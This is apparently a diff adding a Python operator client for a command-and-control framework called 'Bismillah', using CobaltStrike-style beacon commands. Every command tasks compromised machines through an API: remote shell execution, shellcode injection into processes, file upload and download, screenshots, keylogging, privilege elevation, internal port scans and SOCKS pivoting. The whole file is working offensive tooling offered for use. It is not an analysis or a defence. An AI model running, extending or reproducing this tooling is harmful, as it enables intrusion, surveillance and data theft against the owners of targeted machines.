@@ -1,0 +1,286 @@
+#!/usr/bin/env python3
+"""
+cobaltstrike_stub.py - Compatibility layer for CobaltStrike-style beacon commands
+
+This module provides a compatibility layer to interact with the Bismillah C2 framework
+using CobaltStrike-style beacon commands. This allows operators familiar with CS to use
+similar syntax while working with the bismillah framework.
+
+Usage:
+    ./cobaltstrike_stub [command] [arguments]
+    
+    Commands:
+    - beacon_checkin <target>
+    - beacon_shell <target> <command>
+    - beacon_inject <target> <pid> <payload>
+    - beacon_upload <target> <local_file> <remote_path>
+    - beacon_download <target> <remote_file> <local_path>
+    - beacon_screenshot <target>
+    - beacon_keylog <target> <start|stop>
+    - beacon_elevate <target> <technique>
+    - beacon_portscan <target> <remote_host> <ports>
+    - beacon_socks <target> <port>
+    - beacon_help
+"""
+
+import sys
+import os
+import json
+import base64
+import requests
+import argparse
+import time
+from urllib.parse import urljoin
+
+# Config
+C2_SERVER = os.environ.get("BISMILLAH_C2", "http://localhost:8443")
+API_KEY = os.environ.get("BISMILLAH_API_KEY", "default_api_key")
+
+def encode_task(task_data):
+    """Encode task data for transmission"""
+    return base64.b64encode(json.dumps(task_data).encode()).decode()
+
+def send_task(beacon_id, task_type, task_data):
+    """Send task to C2 server"""
+    url = urljoin(C2_SERVER, "/api/task")
+    headers = {
+        "X-API-Key": API_KEY,
+        "Content-Type": "application/json"
+    }
+    data = {
+        "beacon_id": beacon_id,
+        "type": task_type,
+        "data": encode_task(task_data),
+        "sent_at": int(time.time())
+    }
+    
+    try:
+        response = requests.post(url, headers=headers, json=data, timeout=30)
+        if response.status_code == 200:
+            return response.json()
+        else:
+            print(f"Error: Server returned status {response.status_code}")
+            return None
+    except Exception as e:
+        print(f"Error sending task: {e}")
+        return None
+
+def list_beacons():
+    """Get list of active beacons"""
+    url = urljoin(C2_SERVER, "/api/beacons")
+    headers = {"X-API-Key": API_KEY}
+    
+    try:
+        response = requests.get(url, headers=headers, timeout=30)
+        if response.status_code == 200:
+            return response.json()
+        else:
+            print(f"Error: Server returned status {response.status_code}")
+            return []
+    except Exception as e:
+        print(f"Error listing beacons: {e}")
+        return []
+
+def beacon_checkin(beacon_id):
+    """Force beacon check-in"""
+    result = send_task(beacon_id, "checkin", {})
+    if result:
+        print(f"[+] Beacon {beacon_id} check-in requested")
+    else:
+        print(f"[-] Failed to send check-in request to beacon {beacon_id}")
+
+def beacon_shell(beacon_id, command):
+    """Execute shell command"""
+    result = send_task(beacon_id, "shell", {"command": command})
+    if result:
+        print(f"[+] Shell command sent to beacon {beacon_id}: {command}")
+    else:
+        print(f"[-] Failed to send shell command to beacon {beacon_id}")
+
+def beacon_inject(beacon_id, pid, payload_file):
+    """Inject shellcode into process"""
+    try:
+        with open(payload_file, 'rb') as f:
+            payload = base64.b64encode(f.read()).decode()
+    except Exception as e:
+        print(f"[-] Error reading payload file: {e}")
+        return
+        
+    result = send_task(beacon_id, "inject", {
+        "pid": int(pid),
+        "payload": payload
+    })
+    
+    if result:
+        print(f"[+] Process injection sent to beacon {beacon_id} (PID: {pid})")
+    else:
+        print(f"[-] Failed to send injection task to beacon {beacon_id}")
+
+def beacon_upload(beacon_id, local_file, remote_path):
+    """Upload file to target"""
+    try:
+        with open(local_file, 'rb') as f:
+            file_data = base64.b64encode(f.read()).decode()
+    except Exception as e:
+        print(f"[-] Error reading local file: {e}")
+        return
+        
+    result = send_task(beacon_id, "upload", {
+        "file_data": file_data,
+        "remote_path": remote_path
+    })
+    
+    if result:
+        print(f"[+] File upload sent to beacon {beacon_id}: {local_file} -> {remote_path}")
+    else:
+        print(f"[-] Failed to send upload task to beacon {beacon_id}")
+
+def beacon_download(beacon_id, remote_file, local_path):
+    """Download file from target"""
+    result = send_task(beacon_id, "download", {
+        "remote_path": remote_file,
+        "local_path": local_path
+    })
+    
+    if result:
+        print(f"[+] File download sent to beacon {beacon_id}: {remote_file} -> {local_path}")
+    else:
+        print(f"[-] Failed to send download task to beacon {beacon_id}")
+
+def beacon_screenshot(beacon_id):
+    """Take screenshot on target"""
+    result = send_task(beacon_id, "screenshot", {})
+    
+    if result:
+        print(f"[+] Screenshot task sent to beacon {beacon_id}")
+    else:
+        print(f"[-] Failed to send screenshot task to beacon {beacon_id}")
+
+def beacon_keylog(beacon_id, action):
+    """Start/stop keylogger on target"""
+    if action.lower() not in ["start", "stop"]:
+        print("[-] Invalid keylogger action. Use 'start' or 'stop'.")
+        return
+        
+    result = send_task(beacon_id, "keylogger", {
+        "action": action.lower()
+    })
+    
+    if result:
+        print(f"[+] Keylogger {action} task sent to beacon {beacon_id}")
+    else:
+        print(f"[-] Failed to send keylogger task to beacon {beacon_id}")
+
+def beacon_elevate(beacon_id, technique):
+    """Attempt privilege elevation on target"""
+    result = send_task(beacon_id, "elevate", {
+        "technique": technique
+    })
+    
+    if result:
+        print(f"[+] Privilege elevation task sent to beacon {beacon_id} (technique: {technique})")
+    else:
+        print(f"[-] Failed to send privilege elevation task to beacon {beacon_id}")
+
+def beacon_portscan(beacon_id, remote_host, ports):
+    """Scan ports on a host from the target"""
+    result = send_task(beacon_id, "portscan", {
+        "host": remote_host,
+        "ports": ports
+    })
+    
+    if result:
+        print(f"[+] Port scan task sent to beacon {beacon_id} (target: {remote_host}, ports: {ports})")
+    else:
+        print(f"[-] Failed to send port scan task to beacon {beacon_id}")
+
+def beacon_socks(beacon_id, port):
+    """Start SOCKS proxy on target"""
+    result = send_task(beacon_id, "socks", {
+        "port": int(port)
+    })
+    
+    if result:
+        print(f"[+] SOCKS proxy task sent to beacon {beacon_id} (port: {port})")
+    else:
+        print(f"[-] Failed to send SOCKS proxy task to beacon {beacon_id}")
+
+def beacon_help():
+    """Display help information"""
+    print("""
+    Bismillah CobaltStrike Compatibility Layer - Available Commands:
+    
+    beacon_list                             - List all active beacons
+    beacon_checkin <id>                     - Force beacon check-in
+    beacon_shell <id> <command>             - Execute shell command
+    beacon_inject <id> <pid> <payload>      - Inject shellcode into process
+    beacon_upload <id> <local> <remote>     - Upload file to target
+    beacon_download <id> <remote> <local>   - Download file from target
+    beacon_screenshot <id>                  - Take screenshot on target
+    beacon_keylog <id> <start|stop>         - Control keylogger
+    beacon_elevate <id> <technique>         - Attempt privilege elevation
+    beacon_portscan <id> <host> <ports>     - Scan ports from target
+    beacon_socks <id> <port>                - Start SOCKS proxy on target
+    beacon_help                             - Display this help
+    """)
+
+def main():
+    """Parse command-line arguments and execute the appropriate function"""
+    if len(sys.argv) < 2:
+        print("Error: No command specified")
+        beacon_help()
+        return 1
+        
+    command = sys.argv[1]
+    
+    if command == "beacon_list":
+        beacons = list_beacons()
+        if beacons:
+            print("Active beacons:")
+            for beacon in beacons:
+                print(f"  {beacon['id']} - {beacon['hostname']} ({beacon['ip']}) - Last seen: {beacon['last_checkin']}")
+        else:
+            print("No active beacons found.")
+            
+    elif command == "beacon_help":
+        beacon_help()
+        
+    elif command == "beacon_checkin" and len(sys.argv) >= 3:
+        beacon_checkin(sys.argv[2])
+        
+    elif command == "beacon_shell" and len(sys.argv) >= 4:
+        beacon_shell(sys.argv[2], " ".join(sys.argv[3:]))
+        
+    elif command == "beacon_inject" and len(sys.argv) >= 5:
+        beacon_inject(sys.argv[2], sys.argv[3], sys.argv[4])
+        
+    elif command == "beacon_upload" and len(sys.argv) >= 5:
+        beacon_upload(sys.argv[2], sys.argv[3], sys.argv[4])
+        
+    elif command == "beacon_download" and len(sys.argv) >= 5:
+        beacon_download(sys.argv[2], sys.argv[3], sys.argv[4])
+        
+    elif command == "beacon_screenshot" and len(sys.argv) >= 3:
+        beacon_screenshot(sys.argv[2])
+        
+    elif command == "beacon_keylog" and len(sys.argv) >= 4:
+        beacon_keylog(sys.argv[2], sys.argv[3])
+        
+    elif command == "beacon_elevate" and len(sys.argv) >= 4:
+        beacon_elevate(sys.argv[2], sys.argv[3])
+        
+    elif command == "beacon_portscan" and len(sys.argv) >= 5:
+        beacon_portscan(sys.argv[2], sys.argv[3], sys.argv[4])
+        
+    elif command == "beacon_socks" and len(sys.argv) >= 4:
+        beacon_socks(sys.argv[2], sys.argv[3])
+        
+    else:
+        print(f"Error: Invalid command or missing arguments: {command}")
+        beacon_help()
+        return 1
+        
+    return 0
+
+if __name__ == "__main__":
+    sys.exit(main())
